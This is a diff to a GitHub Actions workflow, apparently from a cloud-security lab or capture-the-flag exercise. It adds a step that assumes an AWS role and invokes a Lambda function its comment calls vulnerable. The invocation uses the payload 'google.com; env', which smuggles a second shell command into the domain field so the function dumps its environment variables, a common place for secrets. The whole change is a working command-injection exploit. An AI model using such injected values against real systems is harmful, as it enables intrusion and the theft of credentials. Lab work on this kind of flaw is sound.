@@ -26,5 +26,14 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-        # If access is granted, run this command to find the secret Lambda      - name: List Lambda Functions
-        run: aws lambda list-functions
+      # Invoke the vulnerable Lambda function (nslookupv2) with our payload
+      - name: Invoke Lambda and Inject Command
+        run: |
+          aws lambda invoke \
+            --function-name nslookupv2 \
+            --cli-binary-format raw-in-base64-out \
+            --payload '{"domain": "google.com; env"}' \
+            response.json
+            
+          echo "Lambda Response:"
+          cat response.json
